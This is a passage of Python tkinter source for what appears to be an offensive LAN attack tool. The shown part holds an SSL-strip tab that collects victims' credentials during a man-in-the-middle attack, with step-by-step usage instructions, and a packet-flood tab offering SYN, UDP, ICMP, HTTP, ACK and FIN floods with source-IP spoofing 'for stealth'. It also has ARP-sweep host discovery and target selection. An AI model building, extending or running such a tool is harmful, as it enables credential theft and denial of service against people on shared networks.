                 justify='left').pack(anchor='w', padx=6)

        warn = tk.Frame(f, bg='#1a1000', pady=6)
        warn.pack(fill='x')
        tk.Label(warn,
                 text='  ⚠  MITM mode must be active first (Attack tab → MITM mode → START ATTACK)',
                 font=('Consolas', 8), bg='#1a1000', fg=YELLOW).pack(anchor='w', padx=8)

        body = tk.Frame(f, bg=BG)
        body.pack(fill='both', expand=True, padx=10, pady=6)

        # ── Left control panel ────────────────────────────────────────────────
        lp = tk.Frame(body, bg=BG3, padx=14, pady=14, width=240)
        lp.pack(side='left', fill='y', padx=(0, 6))
        lp.pack_propagate(False)

        tk.Label(lp, text='PROXY SETTINGS', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 8))

        # Port entry
        pr = tk.Frame(lp, bg=BG3)
        pr.pack(fill='x', pady=3)
        tk.Label(pr, text='Proxy port:', font=('Consolas', 9),
                 bg=BG3, fg=TEXT_DIM, width=12, anchor='w').pack(side='left')
        self._ssl_port_var = tk.StringVar(value='8080')
        ttk.Entry(pr, textvariable=self._ssl_port_var,
                  font=('Consolas', 9), width=8).pack(side='left')

        tk.Frame(lp, bg=BORDER, height=1).pack(fill='x', pady=10)

        # Status indicator
        tk.Label(lp, text='STATUS', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 6))

        self._ssl_badge_var = tk.StringVar(value='● INACTIVE')
        self._ssl_badge = tk.Label(lp, textvariable=self._ssl_badge_var,
                                    font=('Consolas', 12, 'bold'), bg=BG3, fg=TEXT_DIM)
        self._ssl_badge.pack(anchor='w')

        tk.Frame(lp, bg=BORDER, height=1).pack(fill='x', pady=10)

        # Attack steps
        tk.Label(lp, text='HOW TO USE', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 8))
        steps = [
            ('1', 'Scanner tab → scan LAN'),
            ('2', 'Attack tab → select targets'),
            ('3', 'Attack tab → MITM mode'),
            ('4', 'Attack tab → START ATTACK'),
            ('5', 'Come here → START STRIP'),
            ('6', 'Victim browses http://'),
            ('7', 'Credentials appear below'),
        ]
        for num, desc in steps:
            r = tk.Frame(lp, bg=BG3)
            r.pack(fill='x', pady=1)
            tk.Label(r, text=f' {num}.', font=('Consolas', 8, 'bold'),
                     bg=BG3, fg=ACCENT, width=3).pack(side='left')
            tk.Label(r, text=desc, font=('Consolas', 8),
                     bg=BG3, fg=TEXT_DIM).pack(side='left')

        tk.Frame(lp, bg=BORDER, height=1).pack(fill='x', pady=10)

        # Dependency check
        dep_color = GREEN if MITMPROXY_OK else ACCENT
        dep_text  = '✓  mitmproxy ready' if MITMPROXY_OK else '✗  mitmproxy missing'
        tk.Label(lp, text=dep_text, font=('Consolas', 8, 'bold'),
                 bg=BG3, fg=dep_color).pack(anchor='w')
        if not MITMPROXY_OK:
            tk.Label(lp, text='pip install mitmproxy',
                     font=('Consolas', 8), bg=BG3, fg=TEXT_DIM).pack(anchor='w')

        tk.Frame(lp, bg=BORDER, height=1).pack(fill='x', pady=10)

        # Buttons
        self._ssl_start_btn = ttk.Button(lp, text='▶  START STRIP',
                                          style='Accent.TButton',
                                          command=self._sslstrip_start)
        self._ssl_start_btn.pack(fill='x', pady=(0, 6))
        self._ssl_stop_btn = ttk.Button(lp, text='■  STOP',
                                         style='Ghost.TButton',
                                         command=self._sslstrip_stop,
                                         state='disabled')
        self._ssl_stop_btn.pack(fill='x')

        # ── Right panel ───────────────────────────────────────────────────────
        rp = tk.Frame(body, bg=BG)
        rp.pack(side='left', fill='both', expand=True)

        # Credentials table
        cred_hdr = tk.Frame(rp, bg=BG2, pady=6)
        cred_hdr.pack(fill='x')
        tk.Label(cred_hdr, text='  CAPTURED CREDENTIALS',
                 font=('Consolas', 9, 'bold'), bg=BG2, fg=ACCENT).pack(side='left')
        ttk.Button(cred_hdr, text='CLEAR', style='Ghost.TButton',
                   command=self._ssl_clear_creds).pack(side='right', padx=6)
        self._ssl_cred_count_var = tk.StringVar(value='0 captured')
        tk.Label(cred_hdr, textvariable=self._ssl_cred_count_var,
                 font=('Consolas', 8), bg=BG2, fg=YELLOW).pack(side='right', padx=10)

        cred_f = tk.Frame(rp, bg=BG)
        cred_f.pack(fill='x', pady=(2, 6))
        ccols = ('time', 'scheme', 'host', 'path', 'field', 'value')
        self._ssl_cred_tree = ttk.Treeview(cred_f, columns=ccols,
                                            show='headings', height=8)
        self._ssl_cred_tree.heading('time',   text='TIME')
        self._ssl_cred_tree.heading('scheme', text='PROTO')
        self._ssl_cred_tree.heading('host',   text='HOST')
        self._ssl_cred_tree.heading('path',   text='PATH')
        self._ssl_cred_tree.heading('field',  text='FIELD')
        self._ssl_cred_tree.heading('value',  text='VALUE')
        self._ssl_cred_tree.column('time',   width=70,  anchor='center')
        self._ssl_cred_tree.column('scheme', width=55,  anchor='center')
        self._ssl_cred_tree.column('host',   width=160, anchor='w')
        self._ssl_cred_tree.column('path',   width=160, anchor='w')
        self._ssl_cred_tree.column('field',  width=110, anchor='w')
        self._ssl_cred_tree.column('value',  width=180, anchor='w')
        csb = ttk.Scrollbar(cred_f, orient='vertical',
                             command=self._ssl_cred_tree.yview)
        self._ssl_cred_tree.configure(yscrollcommand=csb.set)
        self._ssl_cred_tree.pack(side='left', fill='both', expand=True)
        csb.pack(side='right', fill='y')
        self._ssl_cred_tree.tag_configure('cred',  foreground=GREEN)
        self._ssl_cred_tree.tag_configure('plain', foreground=YELLOW)
        self._ssl_cred_count = 0

        # Traffic log
        log_hdr = tk.Frame(rp, bg=BG2, pady=6)
        log_hdr.pack(fill='x')
        tk.Label(log_hdr, text='  INTERCEPTED TRAFFIC',
                 font=('Consolas', 9, 'bold'), bg=BG2, fg=TEXT).pack(side='left')
        ttk.Button(log_hdr, text='CLEAR', style='Ghost.TButton',
                   command=self._ssl_clear_traffic).pack(side='right', padx=6)

        self._ssl_traffic = tk.Text(
            rp, bg=BG, fg=CYAN, font=('Consolas', 8),
            relief='flat', wrap='none', state='disabled', padx=8, pady=4)
        tsb = ttk.Scrollbar(rp, orient='vertical', command=self._ssl_traffic.yview)
        hsb2 = ttk.Scrollbar(rp, orient='horizontal', command=self._ssl_traffic.xview)
        self._ssl_traffic.configure(yscrollcommand=tsb.set, xscrollcommand=hsb2.set)
        tsb.pack(side='right', fill='y')
        hsb2.pack(side='bottom', fill='x')
        self._ssl_traffic.pack(fill='both', expand=True)
        self._ssl_traffic.tag_configure('post',    foreground=ACCENT)
        self._ssl_traffic.tag_configure('get',     foreground=CYAN)
        self._ssl_traffic.tag_configure('https',   foreground=YELLOW)

    # ── HSTS Strip actions ─────────────────────────────────────────────────────

    def _sslstrip_start(self):
        iface = self._iface.get()
        if not iface:
            self.log('[-] No interface selected', 'error')
            return
        try:
            port = int(self._ssl_port_var.get())
        except ValueError:
            self.log('[-] Invalid proxy port', 'error')
            return

        self._sslstrip_engine = SSLStripEngine(
            iface=iface,
            port=port,
            cred_cb=self._sslstrip_on_cred,
            traffic_cb=self._sslstrip_on_traffic,
            log_cb=self.log,
        )
        self._sslstrip_engine.start()
        self._ssl_start_btn.configure(state='disabled')
        self._ssl_stop_btn.configure(state='normal')
        self._ssl_badge_var.set('● RUNNING')
        self._ssl_badge.configure(fg=GREEN)

    def _sslstrip_stop(self):
        if self._sslstrip_engine:
            self._sslstrip_engine.stop()
        self._ssl_start_btn.configure(state='normal')
        self._ssl_stop_btn.configure(state='disabled')
        self._ssl_badge_var.set('● INACTIVE')
        self._ssl_badge.configure(fg=TEXT_DIM)

    def _sslstrip_on_cred(self, host, path, fields, scheme):
        """Called by SSLStripAddon when credentials are found in a POST body."""
        ts = time.strftime('%H:%M:%S')
        tag = 'cred' if scheme == 'http' else 'plain'

        def _do():
            for field, value in fields.items():
                self._ssl_cred_tree.insert(
                    '', 0,
                    values=(ts, scheme.upper(), host, path[:40], field, value),
                    tags=(tag,)
                )
            self._ssl_cred_count += len(fields)
            self._ssl_cred_count_var.set(f'{self._ssl_cred_count} captured')
            self.log(
                f'[!] CREDENTIALS  {host}{path}  →  '
                + '  '.join(f'{k}={v}' for k, v in fields.items()),
                'success'
            )

        self.after(0, _do)

    def _sslstrip_on_traffic(self, method, host, path, ct, scheme):
        """Called by SSLStripAddon for every intercepted HTTP request."""
        ts  = time.strftime('%H:%M:%S')
        tag = 'post' if method == 'POST' else ('https' if scheme == 'https' else 'get')
        line = f'[{ts}]  {method:<6}  {scheme}://{host}{path[:60]}'
        if ct:
            line += f'  [{ct.split(";")[0].strip()}]'

        def _do():
            self._ssl_traffic.configure(state='normal')
            self._ssl_traffic.insert('end', line + '\n', tag)
            self._ssl_traffic.see('end')
            self._ssl_traffic.configure(state='disabled')

        self.after(0, _do)

    def _ssl_clear_creds(self):
        for i in self._ssl_cred_tree.get_children():
            self._ssl_cred_tree.delete(i)
        self._ssl_cred_count = 0
        self._ssl_cred_count_var.set('0 captured')

    def _ssl_clear_traffic(self):
        self._ssl_traffic.configure(state='normal')
        self._ssl_traffic.delete('1.0', 'end')
        self._ssl_traffic.configure(state='disabled')

    # ── Stress Test tab ───────────────────────────────────────────────────────

    def _build_stress_tab(self):
        f = self._tab_stress

        hdr = tk.Frame(f, bg=BG2, pady=8)
        hdr.pack(fill='x')
        tk.Label(hdr, text='  ☄  STRESS TEST  —  Packet Flood',
                 font=('Consolas', 11, 'bold'), bg=BG2, fg=ACCENT).pack(side='left', padx=4)

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  Packet flood — SYN exhausts TCP state tables; UDP/ICMP saturates available bandwidth.\n'
                      '  hping3 mode is fastest (needs binary). Scapy mode is built-in fallback. Spoof source IPs for stealth.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        # Bottom bar must be packed BEFORE the fill/expand body — tkinter allocates
        # bottom space first; anything packed after a fill+expand widget gets no room.
        btn_bar = tk.Frame(f, bg=BG2, pady=8)
        btn_bar.pack(fill='x', side='bottom', padx=10)
        self._st_start_btn = ttk.Button(btn_bar, text='▶  START FLOOD',
                                         style='Accent.TButton',
                                         command=self._stress_start)
        self._st_start_btn.pack(side='left', padx=(0, 8))
        self._st_stop_btn = ttk.Button(btn_bar, text='■  STOP',
                                        style='Ghost.TButton',
                                        command=self._stress_stop,
                                        state='disabled')
        self._st_stop_btn.pack(side='left')

        body = tk.Frame(f, bg=BG)
        body.pack(fill='both', expand=True, padx=10, pady=6)

        # ── Left: all controls ────────────────────────────────────────────────
        lp = tk.Frame(body, bg=BG3, padx=14, pady=14, width=270)
        lp.pack(side='left', fill='y', padx=(0, 6))
        lp.pack_propagate(False)

        # TARGET
        tk.Label(lp, text='TARGET', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 6))

        r = tk.Frame(lp, bg=BG3)
        r.pack(fill='x', pady=2)
        tk.Label(r, text='IP:', font=('Consolas', 9),
                 bg=BG3, fg=TEXT_DIM, width=8, anchor='w').pack(side='left')
        self._st_ip_var = tk.StringVar(value='')
        self._st_ip_cb  = ttk.Combobox(r, textvariable=self._st_ip_var,
                                        font=('Consolas', 9), width=16)
        self._st_ip_cb.pack(side='left', padx=4)
        ttk.Button(r, text='⟳', style='Ghost.TButton',
                   command=self._stress_reload_ips).pack(side='left')

        r2 = tk.Frame(lp, bg=BG3)
        r2.pack(fill='x', pady=2)
        tk.Label(r2, text='Port:', font=('Consolas', 9),
                 bg=BG3, fg=TEXT_DIM, width=8, anchor='w').pack(side='left')
        self._st_port_var = tk.StringVar(value='443')
        ttk.Entry(r2, textvariable=self._st_port_var,
                  font=('Consolas', 9), width=8).pack(side='left', padx=4)
        tk.Label(r2, text='(for TCP/UDP/HTTP)',
                 font=('Consolas', 7), bg=BG3, fg=TEXT_DIM).pack(side='left')

        tk.Frame(lp, bg=BORDER, height=1).pack(fill='x', pady=8)

        # ATTACK TYPE
        tk.Label(lp, text='ATTACK TYPE', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 6))

        self._st_mode = tk.StringVar(value='syn')
        modes = [
            ('syn',  'TCP SYN flood     (connection exhaust)'),
            ('udp',  'UDP flood         (bandwidth exhaust)'),
            ('icmp', 'ICMP flood        (ping of death style)'),
            ('http', 'HTTP GET flood    (app layer — Sc-attack only)'),
            ('ack',  'TCP ACK flood     (hp-attack only)'),
            ('fin',  'TCP FIN flood     (hp-attack only)'),
        ]
        for val, label in modes:
            ttk.Radiobutton(lp, text=label, variable=self._st_mode,
                            value=val).pack(anchor='w', pady=1)

        tk.Frame(lp, bg=BORDER, height=1).pack(fill='x', pady=8)

        # ENGINE
        tk.Label(lp, text='ENGINE', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 6))
        self._st_engine = tk.StringVar(value='hping3')
        ttk.Radiobutton(lp, text='hp-attack  (fastest — needs binary)',
                        variable=self._st_engine, value='hping3').pack(anchor='w', pady=1)
        ttk.Radiobutton(lp, text='Sc-attack  (built-in fallback)',
                        variable=self._st_engine, value='scapy').pack(anchor='w', pady=1)

        tk.Frame(lp, bg=BORDER, height=1).pack(fill='x', pady=8)

        # OPTIONS
        tk.Label(lp, text='OPTIONS', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 6))

        self._st_spoof = tk.BooleanVar(value=True)
        ttk.Checkbutton(lp, text='Randomise source IP  (spoof)',
                        variable=self._st_spoof).pack(anchor='w', pady=2)

        # Threads slider (Scapy only)
        tr = tk.Frame(lp, bg=BG3)
        tr.pack(fill='x', pady=4)
        tk.Label(tr, text='Threads (Sc-attack):', font=('Consolas', 8),
                 bg=BG3, fg=TEXT_DIM).pack(anchor='w')
        trow = tk.Frame(lp, bg=BG3)
        trow.pack(fill='x', padx=6, pady=2)
        self._st_threads_var = tk.IntVar(value=4)
        ttk.Scale(trow, from_=1, to=32, variable=self._st_threads_var,
                  orient='horizontal').pack(side='left', fill='x', expand=True)
        self._st_threads_lbl = tk.Label(trow, text='4',
                                         font=('Consolas', 9), bg=BG3, fg=CYAN, width=4)
        self._st_threads_lbl.pack(side='left', padx=4)
        self._st_threads_var.trace_add('write',
            lambda *_: self._st_threads_lbl.configure(
                text=str(int(self._st_threads_var.get()))))

        # Packet size
        pr = tk.Frame(lp, bg=BG3)
        pr.pack(fill='x', pady=4)
        tk.Label(pr, text='Packet size (bytes, Sc-attack):', font=('Consolas', 8),
                 bg=BG3, fg=TEXT_DIM).pack(anchor='w')
        prow = tk.Frame(lp, bg=BG3)
        prow.pack(fill='x', padx=6, pady=2)
        self._st_size_var = tk.IntVar(value=64)
        ttk.Scale(prow, from_=28, to=1400, variable=self._st_size_var,
                  orient='horizontal').pack(side='left', fill='x', expand=True)
        self._st_size_lbl = tk.Label(prow, text='64 B',
                                      font=('Consolas', 9), bg=BG3, fg=CYAN, width=6)
        self._st_size_lbl.pack(side='left', padx=4)
        self._st_size_var.trace_add('write',
            lambda *_: self._st_size_lbl.configure(
                text=f'{int(self._st_size_var.get())} B'))

        # ── Right: stats + log ────────────────────────────────────────────────
        rp = tk.Frame(body, bg=BG)
        rp.pack(side='left', fill='both', expand=True)

        # Stats card
        stats_card = tk.Frame(rp, bg=BG3, padx=16, pady=14)
        stats_card.pack(fill='x', pady=(0, 6))
        tk.Label(stats_card, text='LIVE STATS',
                 font=('Consolas', 9, 'bold'), bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 8))

        srow = tk.Frame(stats_card, bg=BG3)
        srow.pack(fill='x')

        def _stat_col(parent, label):
            col = tk.Frame(parent, bg=BG3, padx=14)
            col.pack(side='left', expand=True)
            tk.Label(col, text=label, font=('Consolas', 8),
                     bg=BG3, fg=TEXT_DIM).pack()
            v = tk.StringVar(value='—')
            tk.Label(col, textvariable=v,
                     font=('Consolas', 20, 'bold'), bg=BG3, fg=CYAN).pack()
            return v

        self._st_total_var   = _stat_col(srow, 'PACKETS SENT')
        self._st_pps_var     = _stat_col(srow, 'PKT / SEC')
        self._st_elapsed_var = _stat_col(srow, 'ELAPSED')
        self._st_bw_var      = _stat_col(srow, 'EST. BANDWIDTH')

        # Status badge
        self._st_badge_var = tk.StringVar(value='● IDLE')
        self._st_badge = tk.Label(stats_card, textvariable=self._st_badge_var,
                                   font=('Consolas', 10, 'bold'), bg=BG3, fg=TEXT_DIM)
        self._st_badge.pack(anchor='w', pady=(8, 0))

        # Log
        log_hdr = tk.Frame(rp, bg=BG2, pady=6)
        log_hdr.pack(fill='x')
        tk.Label(log_hdr, text='  FLOOD LOG',
                 font=('Consolas', 9, 'bold'), bg=BG2, fg=TEXT).pack(side='left')
        ttk.Button(log_hdr, text='CLEAR', style='Ghost.TButton',
                   command=self._stress_clear_log).pack(side='right', padx=6)

        self._st_log = tk.Text(rp, bg=BG, fg=CYAN, font=('Consolas', 9),
                                relief='flat', wrap='word', state='disabled',
                                padx=8, pady=6)
        sb = ttk.Scrollbar(rp, orient='vertical', command=self._st_log.yview)
        self._st_log.configure(yscrollcommand=sb.set)
        sb.pack(side='right', fill='y')
        self._st_log.pack(fill='both', expand=True)
        self._st_log.tag_configure('error',   foreground=ACCENT)
        self._st_log.tag_configure('success', foreground=GREEN)
        self._st_log.tag_configure('info',    foreground=CYAN)
        self._st_log.tag_configure('warn',    foreground=YELLOW)

        self._stress_reload_ips()

    # ── Stress actions ─────────────────────────────────────────────────────────

    def _stress_reload_ips(self):
        ips = [h['ip'] for h in self._hosts] if self._hosts else []
        self._st_ip_cb['values'] = ips
        if ips and not self._st_ip_var.get():
            self._st_ip_var.set(ips[0])

    def _stress_start(self):
        target_ip = self._st_ip_var.get().strip()
        if not target_ip:
            self._stress_log('[-] Enter a target IP', 'error')
            return
        if target_ip in self._whitelist_ips:
            self._stress_log(f'[-] {target_ip} is whitelisted — remove it from the Whitelist tab first', 'error')
            return
        try:
            target_port = int(self._st_port_var.get())
        except ValueError:
            self._stress_log('[-] Invalid port', 'error')
            return

        iface   = self._iface.get()
        mode    = self._st_mode.get()
        engine  = self._st_engine.get()
        spoof   = self._st_spoof.get()
        threads = int(self._st_threads_var.get())
        size    = int(self._st_size_var.get())

        self._stress_engine = StressEngine(
            iface    = iface,
            log_cb   = self._stress_log,
            stats_cb = self._stress_on_stats,
        )

        ok = False
        if engine == 'hping3':
            ok = self._stress_engine.start_hping3(target_ip, target_port, mode, spoof)
            if not ok:
                # fall back to Scapy automatically
                self._stress_log('[*] Falling back to Scapy engine ...', 'warn')
                engine = 'scapy'

        if engine == 'scapy':
            self._stress_engine.start_scapy(
                target_ip, target_port, mode, spoof, threads, size)
            ok = True

        if ok:
            self._st_start_btn.configure(state='disabled')
            self._st_stop_btn.configure(state='normal')
            self._st_badge_var.set('● FLOODING')
            self._st_badge.configure(fg=ACCENT)

    def _stress_stop(self):
        if self._stress_engine:
            self._stress_engine.stop()
        self._st_start_btn.configure(state='normal')
        self._st_stop_btn.configure(state='disabled')
        self._st_badge_var.set('● STOPPED')
        self._st_badge.configure(fg=YELLOW)
        self._stress_log('[*] Flood stopped', 'warn')

    def _stress_on_stats(self, total, pps, elapsed, engine):
        def _do():
            self._st_total_var.set(f'{total:,}')
            self._st_elapsed_var.set(f'{int(elapsed)}s')
            if pps:
                self._st_pps_var.set(f'{pps:,}')
                # rough bandwidth estimate: pps * avg 64B * 8 bits
                size   = int(self._st_size_var.get())
                bps    = pps * size * 8
                if   bps >= 1_000_000_000: bw = f'{bps/1e9:.1f} Gbps'
                elif bps >= 1_000_000:     bw = f'{bps/1e6:.1f} Mbps'
                else:                       bw = f'{bps/1e3:.0f} Kbps'
                self._st_bw_var.set(bw)
        self.after(0, _do)

    def _stress_log(self, msg, level=''):
        def _do():
            self._st_log.configure(state='normal')
            ts  = time.strftime('%H:%M:%S')
            tag = level if level in ('error', 'success', 'info', 'warn') else ''
            self._st_log.insert('end', f'[{ts}]  {msg}\n', tag)
            self._st_log.see('end')
            self._st_log.configure(state='disabled')
            self.log(msg, level)   # mirror to main log tab
        self.after(0, _do)

    def _stress_clear_log(self):
        self._st_log.configure(state='normal')
        self._st_log.delete('1.0', 'end')
        self._st_log.configure(state='disabled')

    # ── Log tab ───────────────────────────────────────────────────────────────

    def _build_log_tab(self):
        f = self._tab_log

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  Global timestamped event log — every engine writes here in real time.\n'
                      '  Use this tab to monitor all running attacks and debug errors across all modules.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        tb = tk.Frame(f, bg=BG2, pady=7)
        tb.pack(fill='x')
        tk.Label(tb, text='  OUTPUT LOG', font=('Consolas', 9, 'bold'),
                 bg=BG2, fg=TEXT).pack(side='left')
        ttk.Button(tb, text='CLEAR LOG', style='Ghost.TButton',
                   command=self._clear_log).pack(side='right', padx=8)

        self._log_text = tk.Text(
            f, bg=BG, fg=GREEN, font=('Consolas', 9),
            insertbackground=TEXT, relief='flat', wrap='word',
            selectbackground=BG3, selectforeground=TEXT,
            state='disabled', padx=12, pady=8
        )
        sb = ttk.Scrollbar(f, orient='vertical', command=self._log_text.yview)
        self._log_text.configure(yscrollcommand=sb.set)
        sb.pack(side='right', fill='y')
        self._log_text.pack(fill='both', expand=True)
        self._log_text.tag_configure('error',   foreground=ACCENT)
        self._log_text.tag_configure('success', foreground=GREEN)
        self._log_text.tag_configure('info',    foreground=CYAN)
        self._log_text.tag_configure('warn',    foreground=YELLOW)

    # ── Status bar ────────────────────────────────────────────────────────────

    def _build_statusbar(self):
        tk.Frame(self, bg=BORDER, height=1).pack(fill='x', side='bottom')
        bar = tk.Frame(self, bg=BG2, height=26)
        bar.pack(fill='x', side='bottom')
        bar.pack_propagate(False)
        self._status_lbl = tk.Label(bar, text='●  Ready',
                                     font=('Consolas', 8), bg=BG2, fg=TEXT_DIM)
        self._status_lbl.pack(side='left', padx=12)
        self._count_lbl = tk.Label(bar, text='Targets: 0',
                                    font=('Consolas', 8), bg=BG2, fg=TEXT_DIM)
        self._count_lbl.pack(side='right', padx=12)

    # ── Init ──────────────────────────────────────────────────────────────────

    def _init_iface(self):
        try:
            ifaces = get_interfaces()
        except Exception:
            ifaces = [get_default_iface()]
        self._iface_cb['values'] = ifaces
        default = get_default_iface()
        self._iface.set(default if default in ifaces else (ifaces[0] if ifaces else ''))
        self._iface.trace_add('write', lambda *_: self._mac_refresh_status())
        self._auto_detect_subnets()

    # ── Subnet management ─────────────────────────────────────────────────────

    def _auto_detect_subnets(self):
        try:
            nets = get_local_subnets()
        except Exception:
            nets = [_gw_subnet()]
        self._subnets = list(dict.fromkeys(nets))  # deduplicate
        self._refresh_subnet_lb()
        self.log(f'[*] Auto-detected {len(self._subnets)} subnet(s): {", ".join(self._subnets)}', 'info')

    def _refresh_subnet_lb(self):
        self._subnet_lb.delete(0, 'end')
        for s in self._subnets:
            self._subnet_lb.insert('end', s)

    def _add_subnet(self):
        val = self._subnet_entry.get().strip()
        if not val:
            return
        if '/' not in val:
            val += '/24'
        if val in self._subnets:
            self.log(f'[!] {val} already in list', 'warn')
            return
        self._subnets.append(val)
        self._subnet_lb.insert('end', val)
        self.log(f'[+] Added subnet {val}', 'info')

    def _remove_subnet(self):
        sel = self._subnet_lb.curselection()
        if not sel:
            return
        idx = sel[0]
        removed = self._subnets.pop(idx)
        self._subnet_lb.delete(idx)
        self.log(f'[-] Removed subnet {removed}', 'warn')

    # ── Scanner logic ─────────────────────────────────────────────────────────

    def _do_scan(self):
        if not self._subnets:
            self.log('[-] No subnets configured — click AUTO-DETECT first', 'error')
            return
        iface = self._iface.get()
        if not iface:
            self.log('[-] No interface selected', 'error')
            return
        self._scan_btn.configure(state='disabled')
        self._set_status('●  Scanning ...')
        self.log(f'[*] Scanning {len(self._subnets)} subnet(s) on {iface} ...', 'info')
        threading.Thread(target=self._scan_worker,
                         args=(iface, list(self._subnets)), daemon=True).start()

    def _scan_worker(self, iface, subnets):
        try:
            gw   = get_gateway_ip()
            all_devs = []
            seen = set()
            for net in subnets:
                self.after(0, self.log, f'[*] ARP sweep: {net}', 'info')
                devs = arp_scan(net, iface)
                for d in devs:
                    if d['ip'] not in seen:
                        seen.add(d['ip'])
                        d['hostname'] = ''
                        d['netbios']  = ''
                        d['vendor']   = ''
                        d['selected'] = False
                        all_devs.append(d)

            self.after(0, self._populate_tree, all_devs, gw)
            self.after(0, self.log,
                       f'[+] Sweep done — {len(all_devs)} unique host(s) found', 'success')
            self.after(0, self._set_status,
                       f'●  Scan done  |  {len(all_devs)} hosts  |  enriching ...')

            # Enrich each host in its own thread
            self._enrich_pending = len(all_devs)
            for host in all_devs:
                threading.Thread(target=self._enrich_worker,
                                 args=(host,), daemon=True).start()
        except Exception as e:
            self.after(0, self.log, f'[-] Scan failed: {e}', 'error')
            self.after(0, self._set_status, '●  Scan failed')
        finally:
            self.after(0, self._scan_btn.configure, {'state': 'normal'})

    def _enrich_worker(self, host):
        enrich_host(host)
        self.after(0, self._update_tree_row, host)
        self._enrich_pending -= 1
        if self._enrich_pending <= 0:
            self.after(0, self._enrich_lbl.configure, {'text': ''})
            self.after(0, self._set_status,
                       f'●  Ready  |  {len(self._hosts)} hosts enriched')
        else:
            self.after(0, self._enrich_lbl.configure,
                       {'text': f'enriching {self._enrich_pending} host(s) ...'})

    def _rebuild_tree(self):
        """Refresh tree from self._hosts without rescanning (used by import/session load)."""
        try:
            gw = get_gateway_ip()
        except Exception:
            gw = ''
        for item in self._tree.get_children():
            self._tree.delete(item)
        for d in self._hosts:
            is_gw = d['ip'] == gw
            self._tree.insert('', 'end', iid=d['ip'],
                               values=('☐', d['ip'], d['mac'],
                                       d.get('vendor') or '—',
                                       d.get('hostname') or '—',
                                       d.get('netbios') or '—',
                                       d.get('os') or '—',
                                       'GATEWAY' if is_gw else d.get('type', 'HOST')),
                               tags=('gateway' if is_gw else 'host',))
        self._refresh_count()

    def _populate_tree(self, devices, gw_ip):
        for item in self._tree.get_children():
            self._tree.delete(item)
        self._hosts = devices
        self._enrich_lbl.configure(text=f'enriching {len(devices)} host(s) ...')
        for d in devices:
            is_gw = d['ip'] == gw_ip
            self._tree.insert('', 'end', iid=d['ip'],
                               values=('☐', d['ip'], d['mac'], '...', '...', '...', '...',
                                       'GATEWAY' if is_gw else 'HOST'),
                               tags=('pending',))

    def _update_tree_row(self, host):
        if not self._tree.exists(host['ip']):
            return
        vals = self._tree.item(host['ip'], 'values')
        is_checked = vals[0] == '☑'
        try:
            gw = get_gateway_ip()
        except Exception:
            gw = ''
        is_gw = host['ip'] == gw
        tag = ('checked' if is_checked else
               'gateway' if is_gw else 'host')
        self._tree.item(host['ip'],
                        values=(vals[0], host['ip'], host['mac'],
                                host['vendor']   or '—',
                                host['hostname'] or '—',
                                host['netbios']  or '—',
                                host.get('os')   or '—',
                                vals[7]),
                        tags=(tag,))

    # ── Selection ─────────────────────────────────────────────────────────────

    def _toggle_select(self, event):
        row = self._tree.identify_row(event.y)
        if not row:
            return
        host = next((h for h in self._hosts if h['ip'] == row), None)
        if not host:
            return
        host['selected'] = not host['selected']
        vals = self._tree.item(row, 'values')
        try:
            gw = get_gateway_ip()
        except Exception:
            gw = ''
        tag = ('checked' if host['selected'] else
               'gateway' if host['ip'] == gw else 'host')
        self._tree.item(row,
                        values=('☑' if host['selected'] else '☐',
                                vals[1], vals[2], vals[3], vals[4], vals[5], vals[6], vals[7]),
                        tags=(tag,))
        self._refresh_count()

    def _select_all(self):
        try:
            gw = get_gateway_ip()
        except Exception:
            gw = ''
        for h in self._hosts:
            h['selected'] = True
            vals = self._tree.item(h['ip'], 'values')
            self._tree.item(h['ip'],
                            values=('☑', vals[1], vals[2], vals[3], vals[4], vals[5], vals[6], vals[7]),
                            tags=('gateway' if h['ip'] == gw else 'checked',))
        self._refresh_count()

    def _clear_selection(self):
        try:
            gw = get_gateway_ip()
        except Exception:
            gw = ''
        for h in self._hosts:
            h['selected'] = False
            vals = self._tree.item(h['ip'], 'values')
            self._tree.item(h['ip'],
                            values=('☐', vals[1], vals[2], vals[3], vals[4], vals[5], vals[6], vals[7]),
                            tags=('gateway' if h['ip'] == gw else 'host',))
        self._refresh_count()

    def _use_selected(self):
        sel = [h for h in self._hosts if h['selected']]
        if not sel:
            self.log('[!] No hosts selected', 'warn')
            return
        label = ', '.join(h['ip'] for h in sel)
        if len(label) > 60:
            label = f'{len(sel)} host(s) selected'
        self._target_label.configure(text=label, fg=CYAN)
        self.log(f'[*] {len(sel)} target(s) loaded into Attack tab', 'info')
        self._nb.select(self._tab_attack)

    def _refresh_count(self):
        n = sum(1 for h in self._hosts if h['selected'])
        self._count_lbl.configure(text=f'Targets: {n}')

    # ── Attack logic ──────────────────────────────────────────────────────────

    def _toggle_bw(self):
        self._bw_scale.configure(
            state='normal' if self._bw_enabled.get() else 'disabled')

    def _update_bw_label(self, *_):
        self._bw_lbl.configure(text=f'{int(self._bw_var.get())} kbps')

    def _update_itv_label(self, *_):
        self._itv_lbl.configure(text=f'{round(self._interval_var.get(), 1)} s')

    def _update_rs_label(self, *_):
        self._rs_lbl.configure(text=f'{int(self._rescan_var.get())} s')

    def _start_attack(self):
        sel = [h for h in self._hosts if h['selected']]
        if not sel:
            self.log('[!] No targets — select hosts in Scanner tab first', 'warn')
            self._nb.select(self._tab_scanner)
            return
        blocked = [h for h in sel if h['ip'] in self._whitelist_ips]
        for h in blocked:
            self.log(f'[◻] Skipping {h["ip"]} — whitelisted', 'warn')
